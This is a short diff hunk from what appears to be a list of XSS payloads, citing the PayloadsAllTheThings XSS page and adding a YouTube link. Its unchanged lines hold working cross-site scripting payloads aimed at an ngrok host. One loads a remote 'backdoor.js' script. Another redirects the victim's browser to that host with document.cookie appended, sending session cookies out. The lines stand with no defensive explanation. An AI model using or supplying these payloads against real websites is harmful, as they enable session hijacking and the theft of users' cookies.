@@ -20,3 +20,5 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
 <sCrIpt >http://bc81f3574fed.ngrok.io< /ScRipT>
 <sCrIpt src=http://bc81f3574fed.ngrok.io/backdoor.js></script>
 <script>document.location='http://bc81f3574fed.ngrok.io/?c='+document.cookie</script>
+
+https://www.youtube.com/watch?v=Ex7rMSEetOg
